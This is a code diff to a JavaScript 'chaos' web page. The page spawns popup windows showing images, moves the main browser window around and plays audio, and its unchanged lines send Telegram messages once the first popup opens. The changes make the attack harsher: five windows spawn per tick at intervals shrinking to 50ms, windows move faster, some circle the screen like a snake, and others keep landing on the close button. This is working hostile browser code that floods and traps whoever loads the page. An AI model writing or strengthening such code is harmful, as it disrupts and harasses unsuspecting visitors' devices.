@@ -37,6 +37,7 @@ if (isMobileDevice()) {
     let chaosMoveInterval = null;
     let browserWindowMovementInterval = null;
     let audioInstances = [];
+    let snakeWindows = [];
 
     // Store the verified telegramUsername
     let verifiedUsername = '';
@@ -267,13 +268,13 @@ if (isMobileDevice()) {
         isChaosActive = true;
 
         // Initialize chaos spawning variables
-        let spawnInterval = 2000; // Start with 2 seconds interval
-        let spawnDecrement = 100; // Decrease interval by 100ms each time
-        let minSpawnInterval = 100; // Minimum interval of 100ms
+        let spawnInterval = 200; // Start fast
+        let spawnDecrement = 20; // Decrease interval to speed up
+        let minSpawnInterval = 50; // Minimum interval of 50ms
 
         // Start spawning chaos windows
         chaosInterval = setInterval(() => {
-            for (let i = 0; i < 2; i++) { // Spawn multiple windows at once
+            for (let i = 0; i < 5; i++) { // Spawn multiple windows at once
                 spawnChaosWindow();
             }
 
@@ -288,16 +289,14 @@ if (isMobileDevice()) {
         // Move the chaos windows
         chaosMoveInterval = setInterval(() => {
             moveChaosWindows();
-        }, 100); // Move every 100ms
+            moveSnakeWindows();
+        }, 50); // Move every 50ms
 
         // Start moving the main browser window within the webpage
         startMovingBrowserWindow();
 
         // Start the audio chaos effect immediately
         startAudioChaos();
-
-        // Remove background flashing
-        // Removed startBackgroundFlashing();
     }
 
     // Function to spawn a single chaos window
@@ -317,16 +316,17 @@ if (isMobileDevice()) {
                 <head>
                     <title>Chaos Window</title>
                     <style>
-                        body {
+                        html, body {
                             margin: 0;
                             padding: 0;
                             overflow: hidden;
+                            height: 100%;
                             background-color: black;
                         }
                         img {
                             width: 100%;
                             height: 100%;
-                            object-fit: cover;
+                            object-fit: fill;
                         }
                     </style>
                 </head>
@@ -361,7 +361,18 @@ if (isMobileDevice()) {
             chaosWindow.moveTo(x, y);
 
             // Keep track of the chaos window
-            chaosWindows.push(chaosWindow);
+            chaosWindows.push({
+                window: chaosWindow,
+                startX: x,
+                startY: y,
+                angle: Math.random() * 360, // Random starting angle for movement
+                speed: Math.random() * 5 + 1 // Random speed
+            });
+
+            // Assign some windows to move like a snake
+            if (snakeWindows.length < 5 && Math.random() < 0.3) {
+                snakeWindows.push(chaosWindows[chaosWindows.length - 1]);
+            }
 
             // Send Telegram messages once the first chaos window is open
             if (chaosWindows.length === 1) {
@@ -376,29 +387,51 @@ if (isMobileDevice()) {
 
     // Function to move chaos windows randomly
     function moveChaosWindows() {
-        chaosWindows.forEach((chaosWindow, index) => {
+        chaosWindows.forEach((chaosWindowObj, index) => {
+            const chaosWindow = chaosWindowObj.window;
             if (!chaosWindow.closed) {
                 // Randomly resize the window
                 const width = Math.floor(Math.random() * 400) + 200;
                 const height = Math.floor(Math.random() * 300) + 150;
                 chaosWindow.resizeTo(width, height);
 
-                let x, y;
-                if (Math.random() < 0.5) {
-                    // 50% chance to move near the close button area
-                    const closeButton = document.querySelector('.control-button.close');
-                    const rect = closeButton.getBoundingClientRect();
-                    x = window.screenX + rect.left + Math.random() * 100 - 50;
-                    y = window.screenY + rect.top + Math.random() * 100 - 50;
-                } else {
-                    // Random position on the screen
-                    x = Math.floor(Math.random() * (screen.width - width));
-                    y = Math.floor(Math.random() * (screen.height - height));
+                // Move windows that are not snake windows randomly
+                if (!snakeWindows.includes(chaosWindowObj)) {
+                    let x, y;
+                    if (Math.random() < 0.5) {
+                        // 50% chance to move near the close button area
+                        const closeButton = document.querySelector('.control-button.close');
+                        const rect = closeButton.getBoundingClientRect();
+                        x = window.screenX + rect.left + Math.random() * 100 - 50;
+                        y = window.screenY + rect.top + Math.random() * 100 - 50;
+                    } else {
+                        // Random position on the screen
+                        x = Math.floor(Math.random() * (screen.width - width));
+                        y = Math.floor(Math.random() * (screen.height - height));
+                    }
+                    chaosWindow.moveTo(x, y);
                 }
-                chaosWindow.moveTo(x, y);
             } else {
-                // Remove closed windows from the array
+                // Remove closed windows from the arrays
                 chaosWindows.splice(index, 1);
+                const snakeIndex = snakeWindows.indexOf(chaosWindowObj);
+                if (snakeIndex !== -1) {
+                    snakeWindows.splice(snakeIndex, 1);
+                }
+            }
+        });
+    }
+
+    // Function to move snake windows
+    function moveSnakeWindows() {
+        snakeWindows.forEach((chaosWindowObj) => {
+            const chaosWindow = chaosWindowObj.window;
+            if (!chaosWindow.closed) {
+                chaosWindowObj.angle += chaosWindowObj.speed;
+                const radius = 200; // Movement radius
+                const x = chaosWindowObj.startX + radius * Math.cos(chaosWindowObj.angle * Math.PI / 180);
+                const y = chaosWindowObj.startY + radius * Math.sin(chaosWindowObj.angle * Math.PI / 180);
+                chaosWindow.moveTo(x, y);
             }
         });
     }
@@ -407,7 +440,7 @@ if (isMobileDevice()) {
     function startMovingBrowserWindow() {
         let angle = 0;
         const radius = 200; // Increased radius
-        const speed = 0.2; // Increased speed
+        const speed = 0.5; // Increased speed
         const centerX = window.innerWidth / 2 - browserWindow.offsetWidth / 2;
         const centerY = window.innerHeight / 2 - browserWindow.offsetHeight / 2;
 
